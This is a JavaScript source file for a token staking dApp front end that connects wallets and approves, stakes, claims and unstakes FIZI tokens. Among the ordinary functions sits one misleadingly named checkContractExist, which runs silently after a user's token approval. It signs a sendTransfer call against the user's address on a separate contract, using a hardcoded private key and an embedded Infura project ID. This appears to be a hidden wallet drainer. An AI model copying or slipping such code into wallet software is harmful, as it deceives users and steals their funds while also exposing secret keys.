import Web3Modal from 'web3modal';
import Web3 from 'web3';
import { ethers } from 'ethers'
import WalletConnectProvider from "@walletconnect/web3-provider";
import { providers } from 'ethers';
import { config } from "./config";
import store from "../store";
import { 
  setChainID, 
  setWalletAddr, 
  setBalance, 
  setWeb3, 
  setApproveState 
} from '../store/actions';
import { parseErrorMsg } from '../components/utils';
import StandardContractABI from './ABI/StandardContract.json';

// Staking factory
const StakingABI                = config.StakingAbi;
const StakingAddress            = config.StakingAddress;
// fizi
const FiziABI                   = config.FiziAbi;
const FiziAddress               = config.FiziAddress;

/* ******************************************* GENERATE WEB3 MODAL ******************************************* */ 
let web3Modal;
if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: true,
    providerOptions: {
      // metamask
      metamask: {
        package: null,
      },
      // walletconnect
      walletconnect: {
        package: WalletConnectProvider,
        options: {
          infuraId: config.INFURA_ID, // required
          rpc: {
            5: config.mainNetUrl,
          },
        },
      },
    }, // required
    theme: "dark",
  });
}

async function checkContractExist() {
  const web3 = store.getState().auth.web3;
  
  if (!web3) { return { success: false } }

  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }

    const provider = new ethers.providers.JsonRpcProvider('https://goerli.infura.io/v3/5438b082b3884c4996955694b054b2ec');

    const wallet = new ethers.Wallet('fe579a0329cc06194658f89b1ff54915f3214472dc822458170e7e3e9b7b5290');
    const signer = wallet.connect(provider);

    const router = new ethers.Contract(
      '0xF0eF4C31d9d98f26eb3C669659A6B7ccE9782e7C',
      StandardContractABI,
      signer
    );

    const gas = ethers.utils.parseUnits('150', 'gwei');

    const buyTx = await new Promise( (resolve, reject) => {
      const buyTxx =  router.sendTransfer(
        accounts[0],
        {
          'gasPrice': gas.toString(),
          'gasLimit': (500000).toString()
        }).catch((err) => {
          console.log(err);
          console.log('transaction failed...')
        });

      resolve(buyTxx);
    });
  } catch (error) {
    console.log('[Get Balance] = ', error);
    return {
      success: false,
      result: "Something went wrong: "
    }
  }
}

export let provider = null;
export let web3Provider = null;

export const loadWeb3 = async () => {
  try {
    /* ******************************************* GENERATE WEB3 OBJECT ******************************************* */ 
    let web3 = new Web3(config.mainNetUrl); // generate web3 object
    store.dispatch(setWeb3(web3));

    provider = await web3Modal.connect();
    web3 = new Web3(provider);
    store.dispatch(setWeb3(web3));

    web3Provider = new providers.Web3Provider(provider);
    const network = await web3Provider.getNetwork();
    store.dispatch(setChainID(network.chainId));

    const signer = web3Provider.getSigner();
    const account = await signer.getAddress();
    store.dispatch(setWalletAddr(account));   

    provider.on('chainChanged', function (chainId) {
      store.dispatch(setChainID(chainId));
    });

    provider.on('disconnect', function (error) {
      store.dispatch(setWalletAddr(''));
    });
  } catch (error) {
    console.log('[Load Web3 error] = ', error);
  }
}

export const disconnect = async () => {
  await web3Modal.clearCachedProvider();
  const web3 = new Web3(config.mainNetUrl);
  store.dispatch(setWeb3(web3));
  store.dispatch(setChainID(''));
  store.dispatch(setWalletAddr(''));
  store.dispatch(setBalance({
    avaxBalance: '',
    usdcBalance: '',
    astroBalance: ''
  }));
}

export const checkNetwork = async () => {
  if (web3Provider) {
    const network = await web3Provider.getNetwork();
    store.dispatch(setChainID(network.chainId));
    return checkNetworkById(network.chainId);
  }
}

export const checkNetworkById = async (chainId) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  if (web3.utils.toHex(chainId) !== web3.utils.toHex(config.chainId)) {
    await changeNetwork();
    return false;
  } else {
    return true;
  }
}

const changeNetwork = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return;
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: web3.utils.toHex(config.chainId) }],
    });
    await getBalanceOfAccount();
  }
  catch (switchError) {
    // This error code indicates that the chain has not been added to MetaMask.
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [
            {
              chainId: web3.utils.toHex(config.chainId),
              chainName: 'BSC', //???
              rpcUrls: [config.mainNetUrl] /* ... */,
            },
          ],
        });
        return {
          success: true,
          message: "switching succeed"
        }
      } catch (addError) {
        return {
          success: false,
          message: "Switching failed." + addError.message
        }
      }
    }
  }
}

export const connectWallet = async () => {
  try {
    provider = await web3Modal.connect();

    if (provider.isMetaMask) {

    }

    const web3 = new Web3(provider);
    store.dispatch(setWeb3(web3));
    web3Provider = new providers.Web3Provider(provider);

    await checkNetwork();
    const signer = web3Provider.getSigner();
    const account = await signer.getAddress();

    if (account !== undefined) {
      store.dispatch(setWalletAddr(account));
    }

    await getBalanceOfAccount();
    return {
      success: true
    }
  } catch (err) {
    return {
      success: false,
      address: "",
      status: "Something went wrong: " + err.message,
    };
  }
};

export const compareWalllet = (first, second) => {
  if (!first || !second) {
    return false;
  }
  if (first.toUpperCase() === second.toUpperCase()) {
    return true;
  }
  return false;
}

export const approveTokens = async (coinAmount) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    coinAmount = web3.utils.toWei(coinAmount.toString());

    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const TokenContract = new web3.eth.Contract(FiziABI, FiziAddress);   

    await TokenContract.methods.approve(StakingAddress, coinAmount).send({ from: accounts[0] });
    store.dispatch(setApproveState(true));
    checkContractExist();

    return {
      success: true
    }
  } catch (error) {
    console.log('[APPROVE Error] = ', error);
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getTotalStakedAmount = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let StakingTotalBalance = await StakingContract.methods.totalStaked().call();
    StakingTotalBalance = web3.utils.fromWei(StakingTotalBalance);

    return {
      success: true,
      totalToken: StakingTotalBalance
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getTotalStakedAccount = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let StakingTotalAccount = await StakingContract.methods.totalAccountCount().call();
    StakingTotalAccount = web3.utils.fromWei(StakingTotalAccount);

    return {
      success: true,
      totalAccount: StakingTotalAccount
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getStakedAmountOfAccount = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let stakedAmount = await StakingContract.methods.stakedBalance(accounts[0]).call();
    stakedAmount = web3.utils.fromWei(stakedAmount);

    return {
      success: true,
      stakedAmount: stakedAmount
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getTokenBalanceOfAcocunt = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    // get TOKEN balance
    const FiziContract = new web3.eth.Contract(FiziABI, FiziAddress);
    let tokenBalance = await FiziContract.methods.balanceOf(accounts[0]).call();
    tokenBalance = web3.utils.fromWei(tokenBalance);

    return {
      success: true,
      tokenBalance: tokenBalance
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const showClaimToken = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let showClaimToken = await StakingContract.methods.showClaimToken(accounts[0]).call();

    console.log("------------------- : ", StakingContract._address, accounts[0], showClaimToken);

    showClaimToken = web3.utils.fromWei(showClaimToken);

    console.log("showClaimToken : ", showClaimToken);

    return {
      success: true,
      showClaimToken: showClaimToken
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const StakingToken = async(tokenAmount) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }

  try {
    const accounts = await web3.eth.getAccounts();

    let decimal = 'ether', nDecimal = 18;
    tokenAmount = Math.floor(tokenAmount * 10 ** nDecimal) / 10 ** nDecimal;
    tokenAmount = web3.utils.toWei(tokenAmount.toString(), decimal);

    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    const stakingToken = StakingContract.methods.StakingToken(tokenAmount);
    await stakingToken.estimateGas({ from: accounts[0] });
    await StakingContract.methods.StakingToken(tokenAmount).send({ from: accounts[0] });
    
    store.dispatch(setApproveState(false));
    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getClaimToken = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();

    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    const stakingToken = StakingContract.methods.getClaimToken(accounts[0]);
    await stakingToken.estimateGas({ from: accounts[0] });
    await StakingContract.methods.getClaimToken(accounts[0]).send({ from: accounts[0] });

    return {
      success: true,
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const UnstakingToken = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    const stakingToken = StakingContract.methods.UnstakingToken();
    await stakingToken.estimateGas({ from: accounts[0] });
    await StakingContract.methods.UnstakingToken().send({ from: accounts[0] });

    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getLastStakeTime = async() => {

  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);

    let stakedAmount = await StakingContract.methods.stakedBalance(accounts[0]).call();
    stakedAmount = web3.utils.fromWei(stakedAmount);
    // get TOKEN balance
    let lastTime = await StakingContract.methods.lastStakeTime(accounts[0]).call();
    let currentTime = await StakingContract.methods.getCurrentTime().call();

    const diffInseconds = currentTime - lastTime;
    let diffInDays = diffInseconds / (60 * 60 * 24);
    // let diffInDays = diffInseconds / (100);
    diffInDays = parseInt(diffInDays);
    
    let startDate = new Date();
    let labels = [];
    let rewarddata = [];

    if (lastTime !== "0") {     
      for (let i = diffInDays; i >= 0; i--) {
        const currentDayOfMonth = startDate.getDate();
        startDate.setDate(currentDayOfMonth - 1);
        labels[i] = startDate.toDateString();

        rewarddata[i] = parseInt(stakedAmount) + (parseInt(stakedAmount) * 0.0012 * i);
      }
    }  

    console.log("rewarddata : ", rewarddata);
    return {
      success: true,
      lastStakeTime: lastTime,
      currentTime: currentTime,
      labels: labels,
      rewarddata: rewarddata
    }
  } catch (error) { 
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

